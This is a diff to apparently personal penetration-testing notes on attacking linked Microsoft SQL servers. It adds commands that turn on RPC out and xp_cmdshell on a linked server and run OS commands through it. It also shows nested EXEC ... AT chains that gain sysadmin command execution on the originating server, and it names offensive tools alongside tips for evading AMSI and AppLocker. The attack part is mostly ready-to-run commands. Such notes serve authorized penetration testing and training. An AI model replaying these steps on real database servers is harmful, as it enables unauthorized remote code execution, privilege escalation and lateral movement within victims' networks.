@@ -245,9 +245,9 @@ SELECT * FROM sys.servers;
 Test query on the linked MSSQL server using the "OPENQUERY" statement. Unluckily, the "OPENQUERY" statement doesn't support executing stored procedures:
 
 ```
-select version from openquery("dc01", 'select @@version as version');   -> DC01 is the linked server
+select version from openquery("DC01", 'select @@version as version');   -> DC01 is the linked server
 
-select version from openquery("dc01", 'select system_user');
+select version from openquery("DC01", 'select system_user');
 ```
 
 For this example, assume that DC01 is the linked server. When executing "RECONFIGURE" statements on a remote server, the created link must be configured with [outbound RPC](https://learn.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms186839(v=sql.105)?redirectedfrom=MSDN). If "RPC out" is not enabled, we can enable it using the ["SP_SERVEROPTION"](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-serveroption-transact-sql?view=sql-server-ver15) statement:
@@ -255,29 +255,44 @@ For this example, assume that DC01 is the linked server. When executing "RECONFI
 ```
 1. EXEC sp_serveroption 'LOCALHOST\instance', 'rpc', true;
 
+#From an sqlcmd(example)
+EXEC sp_serveroption 'DC01', 'rpc', true;
+GO
+
 2. EXEC sp_serveroption 'LOCALHOST\instance', 'rpc out', true;
+
+#From impacket-mssqlclient(example)
+EXEC sp_serveroption 'DC01', 'rpc out', true;
 ```
 
 ```
-1st EXEC (sp_configure 'show advanced options', 1; RECONFIGURE;) AT dc01
+1st EXEC (sp_configure 'show advanced options', 1; RECONFIGURE;) AT DC01
 
-2nd EXEC (sp_configure 'xp_cmdshell', 1; RECONFIGURE;) AT dc01
+2nd EXEC (sp_configure 'xp_cmdshell', 1; RECONFIGURE;) AT DC01
 
-3rd EXEC (xp_cmdshell 'whoami';) AT dc01
+3rd EXEC (xp_cmdshell 'whoami';) AT DC01
 ```
+
+Obiously, to be able to get code execution in the linked MSSQL server we must have the sysadmin role, which it is controlled by the "Security context" or from our SQL login.
 
 **PRIVILEGE ESCALATION THROUGHA LINKED MSSQLSERVER:**
 
-Supose that we have low privileges on our current MSSQL server, however there is a linked MSSQL server where we do have high privileges. So how do we do to gain high privileges on our first MSSQL server?
-(For demonstration purposes we have low privileges on dc01 but high privileges on appsrv01)
+Supose that we have low privileges on our current MSSQL server(APPSRV01), however there is a linked MSSQL server(DC01) which have a link to APPSRV01 configured with impersonation(the link of DC01 to APPSRV01). 
 
 Here are the commands we must throw through dc01:
 
 ```
-1st EXEC ('EXEC (sp_configure "show advanced options", 1; reconfigure;  ) AT appsrv01') AT dc01
+1st EXEC ('EXEC (sp_configure "show advanced options", 1; reconfigure;) AT appsrv01') AT dc01
 
 2nd EXEC ('EXEC (sp_configure "xp_cmdshell", 1; reconfigure;) AT appsrv01') AT dc01
 
 3rd EXEC ('EXEC (xp_cmdshell "whoami";) AT appsrv01') AT dc01
 ```
 
+**USEFUL SCRIPTS:**
+
+[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL/tree/master), is written in PowerShell, could be useful after bypassing AMSI and disabling signatures.
+
+[DAFT](https://github.com/NetSPI/DAFT/tree/master) it is like an "enhanced" sqlcmd. It is an EXE. It is a C# implementation of PowerUpSQL.
+
+[ESC](https://github.com/NetSPI/ESC) it is like DAFT, but it has designed to work with msbuild which could help for bypassing AppLocker. It can also be invoked using PowerShell Reflection. 
